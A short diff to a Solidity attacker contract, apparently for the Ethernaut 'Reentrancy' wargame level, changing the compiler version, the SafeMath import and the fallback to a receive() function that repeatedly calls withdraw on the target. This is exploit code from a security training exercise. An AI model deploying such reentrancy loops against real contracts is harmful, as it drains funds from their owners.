@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
-pragma solidity 0.8.20;
+pragma solidity ^0.6.12;
 
-import {SafeMath} from "@openzeppelin/contracts/math/SafeMath.sol";
+import {SafeMath} from "./SafeMath.sol";
 
 /**
  * @title 10. REENTRANCY
@@ -31,7 +31,7 @@ contract Ethernaut_Reentrancy {
     }
 
     // the fallback will take care of the reentrancy attack
-    fallback() external payable {
+    receive() external payable {
         if (target.balance >= donation) {
             IReentrance(target).withdraw(donation);
         }
